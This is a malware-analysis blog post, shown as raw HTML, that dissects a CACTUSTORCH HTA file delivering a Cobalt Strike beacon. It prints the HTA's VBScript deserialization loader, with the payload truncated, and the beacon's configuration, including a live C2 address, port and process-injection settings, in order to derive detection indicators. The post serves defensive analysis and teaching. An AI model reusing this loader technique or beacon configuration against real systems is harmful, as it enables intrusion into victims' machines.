<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike" /><meta property="og:locale" content="en" /><meta name="description" content="There are loads of different ways adversaries can distribute Cobalt Strike beacons and other malware. One of the common methods includes using HTML Application (HTA) files. In this post I’m going to look at a malicious HTA file created using CACTUSTORCH and designed to distribute a Cobalt Strike beacon. If you want to follow along at home, the sample is in MalwareBazaar here: https://bazaar.abuse.ch/sample/4d4d70e1918494a0a39641bd8dbfc23ae6451f3d20396b43f150623b8cfe4e93/" /><meta property="og:description" content="There are loads of different ways adversaries can distribute Cobalt Strike beacons and other malware. One of the common methods includes using HTML Application (HTA) files. In this post I’m going to look at a malicious HTA file created using CACTUSTORCH and designed to distribute a Cobalt Strike beacon. If you want to follow along at home, the sample is in MalwareBazaar here: https://bazaar.abuse.ch/sample/4d4d70e1918494a0a39641bd8dbfc23ae6451f3d20396b43f150623b8cfe4e93/" /><link rel="canonical" href="https://forensicitguy.github.io/analyzing-cactustorch-hta-cobaltstrike/" /><meta property="og:url" content="https://forensicitguy.github.io/analyzing-cactustorch-hta-cobaltstrike/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-16T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-28T23:09:20+00:00","datePublished":"2022-01-16T00:00:00+00:00","description":"There are loads of different ways adversaries can distribute Cobalt Strike beacons and other malware. One of the common methods includes using HTML Application (HTA) files. In this post I’m going to look at a malicious HTA file created using CACTUSTORCH and designed to distribute a Cobalt Strike beacon. If you want to follow along at home, the sample is in MalwareBazaar here: https://bazaar.abuse.ch/sample/4d4d70e1918494a0a39641bd8dbfc23ae6451f3d20396b43f150623b8cfe4e93/","headline":"Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/analyzing-cactustorch-hta-cobaltstrike/"},"url":"https://forensicitguy.github.io/analyzing-cactustorch-hta-cobaltstrike/"}</script><title>Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tony Lambert</a></div><div class="site-subtitle font-italic">An educator that does security things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener"> <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1642291200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-01-16 </em> </span> <span> Updated <em class="timeago" data-ts="1648508960" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-28 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1277 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><p>There are loads of different ways adversaries can distribute Cobalt Strike beacons and other malware. One of the common methods includes using HTML Application (HTA) files. In this post I’m going to look at a malicious HTA file created using CACTUSTORCH and designed to distribute a Cobalt Strike beacon. If you want to follow along at home, the sample is in MalwareBazaar here: <a href="https://bazaar.abuse.ch/sample/4d4d70e1918494a0a39641bd8dbfc23ae6451f3d20396b43f150623b8cfe4e93/">https://bazaar.abuse.ch/sample/4d4d70e1918494a0a39641bd8dbfc23ae6451f3d20396b43f150623b8cfe4e93/</a></p><h2 id="triaging-the-file"><span class="mr-2">Triaging the File</span><a href="#triaging-the-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>MalwareBazaar tags say the file is a HTA, and we can use <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">head</code> to confirm this.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/hta-cs$</span><span class="w"> </span>file 1234.hta 
<span class="go">1234.hta: HTML document, ASCII text, with very long lines, with CRLF line terminators

</span><span class="gp">remnux@remnux:~/cases/hta-cs$</span><span class="w"> </span><span class="nb">head</span> <span class="nt">-c</span> 100 1234.hta 
<span class="gp">&lt;script language="VBScript"&gt;</span><span class="w">
</span><span class="go">Dim binary : binary = "notepad.exe"
Dim code : code = "TVroAAAAAFuJ31
</span></pre></table></code></div></div><p>Alrighty then, it looks like <code class="language-plaintext highlighter-rouge">file</code> thinks the sample is a HTML document (containing HTML tags). The <code class="language-plaintext highlighter-rouge">head</code> command shows us the first 100 bytes here, and it looks like the file does contain at least one <code class="language-plaintext highlighter-rouge">script</code> HTML tag.</p><p>Let’s take a look at the content!</p><h2 id="analyzing-the-hta-content"><span class="mr-2">Analyzing the HTA Content</span><a href="#analyzing-the-hta-content" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I’ve included the contents of the HTA below, truncating a lot of base64 code that was included so we can see the good stuff.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre><span class="nt">&lt;script </span><span class="na">language=</span><span class="s">"VBScript"</span><span class="nt">&gt;</span>
<span class="nx">Dim</span> <span class="nx">binary</span> <span class="p">:</span> <span class="nx">binary</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">notepad.exe</span><span class="dl">"</span>
<span class="nx">Dim</span> <span class="nx">code</span> <span class="p">:</span> <span class="nx">code</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">TVroAAAAAFuJ31J...</span><span class="dl">"</span>
<span class="nx">Sub</span> <span class="nx">Debug</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
<span class="nx">End</span> <span class="nx">Sub</span>
<span class="nx">Sub</span> <span class="nx">SetVersion</span>
<span class="nx">End</span> <span class="nx">Sub</span>
<span class="nb">Function</span> <span class="nx">Base64ToStream</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span>
  <span class="nx">Dim</span> <span class="nx">enc</span><span class="p">,</span> <span class="nx">length</span><span class="p">,</span> <span class="nx">ba</span><span class="p">,</span> <span class="nx">transform</span><span class="p">,</span> <span class="nx">ms</span>
  <span class="nb">Set</span> <span class="nx">enc</span> <span class="o">=</span> <span class="nx">CreateObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">System.Text.ASCIIEncoding</span><span class="dl">"</span><span class="p">)</span>
  <span class="nx">length</span> <span class="o">=</span> <span class="nx">enc</span><span class="p">.</span><span class="nx">GetByteCount_2</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span>
  <span class="nb">Set</span> <span class="nx">transform</span> <span class="o">=</span> <span class="nx">CreateObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">System.Security.Cryptography.FromBase64Transform</span><span class="dl">"</span><span class="p">)</span>
  <span class="nb">Set</span> <span class="nx">ms</span> <span class="o">=</span> <span class="nx">CreateObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">System.IO.MemoryStream</span><span class="dl">"</span><span class="p">)</span>
  <span class="nx">ms</span><span class="p">.</span><span class="nx">Write</span> <span class="nx">transform</span><span class="p">.</span><span class="nx">TransformFinalBlock</span><span class="p">(</span><span class="nx">enc</span><span class="p">.</span><span class="nx">GetBytes_4</span><span class="p">(</span><span class="nx">b</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">length</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">((</span><span class="nx">length</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
  <span class="nx">ms</span><span class="p">.</span><span class="nx">Position</span> <span class="o">=</span> <span class="mi">0</span>
  <span class="nb">Set</span> <span class="nx">Base64ToStream</span> <span class="o">=</span> <span class="nx">ms</span>
<span class="nx">End</span> <span class="nb">Function</span>
<span class="nx">Sub</span> <span class="nx">Run</span>
<span class="nx">Dim</span> <span class="nx">s</span><span class="p">,</span> <span class="nx">entry_class</span>
<span class="nx">s</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy</span><span class="dl">"</span>
<span class="nx">s</span> <span class="o">=</span> <span class="nx">s</span> <span class="o">&amp;</span> <span class="dl">"</span><span class="s2">AwAAAAhEZWx...</span><span class="dl">"</span>
<span class="nx">entry_class</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">cactusTorch</span><span class="dl">"</span>
<span class="nx">Dim</span> <span class="nx">fmt</span><span class="p">,</span> <span class="nx">al</span><span class="p">,</span> <span class="nx">d</span><span class="p">,</span> <span class="nx">o</span>
<span class="nb">Set</span> <span class="nx">fmt</span> <span class="o">=</span> <span class="nx">CreateObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">System.Runtime.Serialization.Formatters.Binary.BinaryFormatter</span><span class="dl">"</span><span class="p">)</span>
<span class="nb">Set</span> <span class="nx">al</span> <span class="o">=</span> <span class="nx">CreateObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">System.Collections.ArrayList</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">al</span><span class="p">.</span><span class="nx">Add</span> <span class="nx">fmt</span><span class="p">.</span><span class="nx">SurrogateSelector</span>
<span class="nb">Set</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">fmt</span><span class="p">.</span><span class="nx">Deserialize_2</span><span class="p">(</span><span class="nx">Base64ToStream</span><span class="p">(</span><span class="nx">s</span><span class="p">))</span>
<span class="nb">Set</span> <span class="nx">o</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">DynamicInvoke</span><span class="p">(</span><span class="nx">al</span><span class="p">.</span><span class="nx">ToArray</span><span class="p">()).</span><span class="nx">CreateInstance</span><span class="p">(</span><span class="nx">entry_class</span><span class="p">)</span>
<span class="nx">o</span><span class="p">.</span><span class="nx">flame</span> <span class="nx">binary</span><span class="p">,</span><span class="nx">code</span>
<span class="nx">End</span> <span class="nx">Sub</span>
<span class="nx">SetVersion</span>
<span class="nx">On</span> <span class="nb">Error</span> <span class="nx">Resume</span> <span class="nx">Next</span>
<span class="nx">Run</span>
<span class="nx">If</span> <span class="nx">Err</span><span class="p">.</span><span class="nb">Number</span> <span class="o">&lt;&gt;</span> <span class="mi">0</span> <span class="nx">Then</span>
  <span class="nx">Debug</span> <span class="nx">Err</span><span class="p">.</span><span class="nx">Description</span>
  <span class="nx">Err</span><span class="p">.</span><span class="nx">Clear</span>
<span class="nx">End</span> <span class="nx">If</span>
<span class="nb">self</span><span class="p">.</span><span class="nx">close</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>When looking at the sample there are a few things that stand out. First, there are two large chunks of base64 code in the file. The filesize of the HTA is around 287 KiB, which is really hefty for a text file. When you have plaintext files that large, we can usually assume there are obfuscation schemes or binary/shellcode content embedded. In this case, the strings and variable names are too neat and not scrambled, so obfuscation is out. The first base64 chunk starts with <code class="language-plaintext highlighter-rouge">TVro</code>, which decodes to a <code class="language-plaintext highlighter-rouge">MZ</code> header seen with Windows EXEs.</p><p>The second big thing that stands out is <code class="language-plaintext highlighter-rouge">binary = "notepad.exe"</code>. This is a quick and simple indicator for our analysis. Process names like this in malicious code typically mean that the malicious binary content will be saved and executed as the process name or injected into a process of the same name. If the name is a legitimate Windows binary I tend to lean toward the latter case of injection.</p><p>Finally, <code class="language-plaintext highlighter-rouge">entry_class = "cactusTorch"</code> is significant. This line of code leads us to the CACTUSTORCH project’s <a href="https://github.com/mdsecactivebreach/CACTUSTORCH/blob/master/CACTUSTORCH.hta">HTA template</a>. CACTUSTORCH is a project to embed Cobalt Strike beacons into script content such as HTA and VBS files. Thankfully, the template gives us a head start on analysis. The second base64 chunk is static content and the first looks to be variable content containing the actual payload. With that in mind, let’s extract the payload.</p><h2 id="decoding-the-payload"><span class="mr-2">Decoding the Payload</span><a href="#decoding-the-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>To decode the payload, we can place all the base64 content into its own file and then use the <code class="language-plaintext highlighter-rouge">base64 -d</code> command to get the cleartext payload.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/hta-cs$</span><span class="w"> </span><span class="nb">cat </span>payload.b64 | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> payload.bin
<span class="go">
</span><span class="gp">remnux@remnux:~/cases/hta-cs$</span><span class="w"> </span>file payload.bin 
<span class="go">payload.bin: MS-DOS executable PE32 executable (DLL) (GUI) Intel 80386, for MS Windows

</span><span class="gp">remnux@remnux:~/cases/hta-cs$</span><span class="w"> </span><span class="nb">md5sum </span>payload.bin 
<span class="go">86a7eaba09313ab6b4a01a5e6d573acc  payload.bin
</span></pre></table></code></div></div><p>By searching for the MD5 hash on VirusTotal we can see someone’s already reported the <a href="https://www.virustotal.com/gui/file/e4ec55839a1546633964e2028e7c78930cc574483ce0d22566cb4e238041cd05">beacon executable content</a> and a load of vendors detect it as Cobalt Strike. Let’s squeeze some more indicators from this beacon using 1768.py:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/hta-cs$</span><span class="w"> </span>1768.py payload.bin 
<span class="go">File: payload.bin
payloadType: 0x10014a34
payloadSize: 0x00000000
intxorkey: 0x00000000
id2: 0x00000000
Config found: xorkey b'.' 0x0002fe20 0x00033000
0x0001 payload type                     0x0001 0x0002 0 windows-beacon_http-reverse_http
0x0002 port                             0x0001 0x0002 12342
0x0003 sleeptime                        0x0002 0x0004 60000
0x0004 maxgetsize                       0x0002 0x0004 1048576
0x0005 jitter                           0x0001 0x0002 0
0x0006 maxdns                           0x0001 0x0002 255
0x0007 publickey                        0x0003 0x0100 30819f300d06092a864886f70d010101050003818d00308189028181009352527b27bf73fcc92457cf8cb1894ebd1104da185d18dceb28f159d74958d0ae657a003eba6e49c44484682d30a0381298e1ab921d608b3fda43077ab46e268a1160a62d2821b7f0bba5d96c4ea08581b2bb617bf80e5389f454cef53460b5e32bbf045b5d978631f1e0aa29305fc0b4e02e786c1f888d83997c0dceb043bf020301000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
0x0008 server,get-uri                   0x0003 0x0100 '42.193.229.33,/j.ad'
</span><span class="gp">0x0009 useragent                        0x0003 0x0080 'Mozilla/4.0 (compatible;</span><span class="w"> </span>MSIE 8.0<span class="p">;</span> Windows NT 6.1<span class="o">)</span><span class="s1">'
</span><span class="go">0x000a post-uri                         0x0003 0x0040 '/submit.php'
0x000b Malleable_C2_Instructions        0x0003 0x0100
  Transform Input: [7:Input,4]
   Print
0x000c http_get_header                  0x0003 0x0100
  Build Metadata: [7:Metadata,3,6:Cookie]
   BASE64
   Header Cookie
0x000d http_post_header                 0x0003 0x0100
  Const_header Content-Type: application/octet-stream
  Build SessionId: [7:SessionId,5:id]
   Parameter id
  Build Output: [7:Output,4]
   Print
0x000e SpawnTo                          0x0003 0x0010 (NULL ...)
0x001d spawnto_x86                      0x0003 0x0040 '%windir%\\syswow64\\rundll32.exe'
0x001e spawnto_x64                      0x0003 0x0040 '%windir%\\sysnative\\rundll32.exe'
0x000f pipename                         0x0003 0x0080 (NULL ...)
0x001f CryptoScheme                     0x0001 0x0002 0
0x0013 DNS_Idle                         0x0002 0x0004 0 0.0.0.0
0x0014 DNS_Sleep                        0x0002 0x0004 0
0x001a get-verb                         0x0003 0x0010 'GET'
0x001b post-verb                        0x0003 0x0010 'POST'
0x001c HttpPostChunk                    0x0002 0x0004 0
0x0025 license-id                       0x0002 0x0004 305419896
0x0026 bStageCleanup                    0x0001 0x0002 0
0x0027 bCFGCaution                      0x0001 0x0002 0
0x0036 HostHeader                       0x0003 0x0080 (NULL ...)
0x0032 UsesCookies                      0x0001 0x0002 1
0x0023 proxy_type                       0x0001 0x0002 2 IE settings
0x0037 EXIT_FUNK                        0x0001 0x0002 0
0x0028 killdate                         0x0002 0x0004 0
0x0029 textSectionEnd                   0x0002 0x0004 0
0x002b process-inject-start-rwx         0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002c process-inject-use-rwx           0x0001 0x0002 64 PAGE_EXECUTE_READWRITE
0x002d process-inject-min_alloc         0x0002 0x0004 0
0x002e process-inject-transform-x86     0x0003 0x0100 (NULL ...)
0x002f process-inject-transform-x64     0x0003 0x0100 (NULL ...)
0x0035 process-inject-stub              0x0003 0x0010 '¥l\x818d¯\x87\x8aL\x10\x08&lt;¡W\x8e\n'
0x0033 process-inject-execute           0x0003 0x0080 '\x01\x02\x03\x04'
0x0034 process-inject-allocation-method 0x0001 0x0002 0
0x0000
Guessing Cobalt Strike version: 4.0 (max 0x0037)
</span></pre></table></code></div></div><p>The most actionable indicators from this output are:</p><ul><li>server,get-uri ‘42.193.229.33,/j.ad’<li>port 12342<li>useragent ‘Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)’<li>post-uri ‘/submit.php’<li>spawnto_x86 ‘%windir%\syswow64\rundll32.exe’<li>spawnto_x64 ‘%windir%\sysnative\rundll32.exe’</ul><p>The server, get-uri, set-uri, port, and useragent fields are pretty helpful for network-based detection telemetry. In you can use PCAP, logs, or Netflow evidence to spot one or more of these components. The useragent and post-uri fields will need to be combined with additional data to be effective. The spawnto_* fields are helpful for endpoint-based detection telemetry. You can use Sysmon, EDR, or whatever else to look for suspicious instances of <code class="language-plaintext highlighter-rouge">rundll32.exe</code> with no command line. For this particular threat, we’ll likely see a process ancestry of <code class="language-plaintext highlighter-rouge">mshta.exe -&gt; notepad.exe -&gt; rundll32.exe</code>.</p><p>A data point that is less actionable but still interesting is the license-id/watermark. In this case the beacon contains the license-id value <code class="language-plaintext highlighter-rouge">305419896</code>. This value has been seen in multiple incidents over the last few years, and it corresponds with a <a href="https://papers.vx-underground.org/papers/VXUG/Mirrors/content_dam_blackberry-com_asset_enterprise_pdf_direct_bb-ebook-finding-beacons-in-the-dark.pdf">leaked version of Cobalt Strike</a>.</p><p>Now that we’ve squeezed all those indicators out of the beacon, let’s try and confirm the process ancestry for endpoint detection analytics.</p><h2 id="using-a-sandbox-report-to-confirm-behavior"><span class="mr-2">Using a Sandbox Report to Confirm Behavior</span><a href="#using-a-sandbox-report-to-confirm-behavior" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Thankfully, a sandbox report for the HTA already exists thanks to VMRay: <a href="https://www.vmray.com/analyses/4d4d70e19184/report/overview.html">https://www.vmray.com/analyses/4d4d70e19184/report/overview.html</a></p><p>Looking over at the “Behavior” tab, we can confirm at least part of the ancestry:</p><p><img data-src="/assets/images/analyzing-cactustorch-hta-cobaltstrike/vmray-behavior.png" alt="VMRay Behavior Tab" data-proofer-ignore></p><p>So for detection analytics we can look for instances of notepad.exe spawning from mshta.exe to find suspicious behavior for this threat. Thanks for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>Malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/hta/" class="post-tag no-text-decoration" >hta</a> <a href="/tags/cobalt-strike/" class="post-tag no-text-decoration" >cobalt-strike</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike - Tony Lambert&amp;url=https://forensicitguy.github.io/analyzing-cactustorch-hta-cobaltstrike/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike - Tony Lambert&amp;u=https://forensicitguy.github.io/analyzing-cactustorch-hta-cobaltstrike/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://forensicitguy.github.io/analyzing-cactustorch-hta-cobaltstrike/&amp;text=Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike - Tony Lambert" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensicitguy.github.io/analyzing-cactustorch-hta-cobaltstrike/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" 